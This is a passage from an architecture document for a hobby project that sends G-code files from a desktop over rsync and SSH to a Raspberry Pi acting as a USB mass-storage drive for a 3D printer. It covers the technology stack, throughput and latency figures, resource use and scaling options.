retry_command 3 2 2 rsync -avz /src /dest
```

**Complex Operations Hidden**:
- Error traps with line numbers
- Colored output
- Syslog integration
- Retry with backoff
- Timeout wrapper

**Benefits**:
- Simple API for scripts
- Consistent error handling
- Reduced code duplication

---

## Technology Stack

### Desktop Monitor

**Language**: Python 3.6+
**Dependencies**:
- `watchdog==3.0.0` (file system events)
- Standard library: `os`, `sys`, `subprocess`, `shlex`, `logging`, `threading`, `time`, `re`, `pathlib`

**System Tools**:
- `rsync` (file transfer)
- `ssh` (remote execution)
- `systemd` (service management, optional)

---

### Raspberry Pi Server

**Operating System**: Raspberry Pi OS (Lite or Desktop)
**Kernel**: 4.9+ with USB gadget support

**Kernel Modules**:
- `dwc2` (USB Device Controller)
- `libcomposite` (ConfigFS gadget framework)
- `g_mass_storage` (USB mass storage gadget)

**System Tools**:
- `modprobe` (module loading)
- `sync` (filesystem flush)
- `sudo` (privilege escalation)
- `ssh` (remote access)
- `rsync` (file transfer server)

---

### Network

**Protocols**:
- SSH 2.0 (encrypted transport)
- rsync 3.0+ (file synchronization)
- USB 2.0 Mass Storage Class (device protocol)

**Network Stack**:
- TCP/IP (layer 4)
- WiFi 2.4GHz/5GHz (layer 2)
- NetworkManager (WiFi configuration)

---

### Testing & CI

**Test Framework**: pytest
**Test Files**:
- `tests/unit/test_validation.py`
- `tests/security/test_security.py`
- `tests/integration/test_integration.py`

**Test Runner**: `run_tests.sh`

---

## Performance Characteristics

### Throughput

**Optimized Performance**:
- Small files (1-10 MB): 5-10 MB/s (transfer time dominated by overhead)
- Medium files (10-100 MB): 5.5 MB/s (network-limited)
- Large files (100-1000 MB): 5.5 MB/s (network-limited)

**Bottleneck**: 2.4GHz WiFi (34% link utilization, room for 3x improvement with 5GHz)

---

### Latency

**End-to-End Latency** (55 MB file):
- File detection: 0.001s
- Validation: 1.02s (settle delay + checks)
- Transfer: 10s (network speed)
- USB refresh: 1-3s (re-enumeration)
- **Total**: ~12 seconds

---

### Resource Usage

**Desktop Monitor**:
- CPU: <5% idle, 25% during transfer
- Memory: ~100 MB (watchdog overhead)
- Disk I/O: Minimal (monitor only, doesn't read files)

**Raspberry Pi**:
- CPU: <10% idle, 50% during transfer (encryption)
- Memory: ~50 MB (rsync + USB gadget)
- Disk I/O: 5.5 MB/s write (network-limited)

---

### Scalability

**Horizontal Scaling**:
- Multiple monitors → Single Pi: Yes (rsync handles concurrent writes)
- Single monitor → Multiple Pis: Yes (multiple monitor instances)
- Multiple monitors → Multiple Pis: Yes (N:M relationship)

**Vertical Scaling**:
- Upgrade Pi Zero W → Pi Zero 2W: 2-3x CPU improvement
- Upgrade 2.4GHz → 5GHz WiFi: 2-4x throughput improvement
- Upgrade WiFi → Ethernet: 5-10x throughput improvement

---

## References

- **Code**: `/home/milugo/Claude_Code/Send_To_Printer/`
- **Tests**: `/home/milugo/Claude_Code/Send_To_Printer/tests/`
- **Documentation**: `/home/milugo/Claude_Code/Send_To_Printer/docs/`
- **GitHub**: https://github.com/mlugo-apx/pi-gcode-server

---

**For setup instructions**, see [PI_SETUP.md](PI_SETUP.md)
**For troubleshooting**, see [TROUBLESHOOTING.md](TROUBLESHOOTING.md)
**For quick start**, see [QUICKSTART.md](QUICKSTART.md)
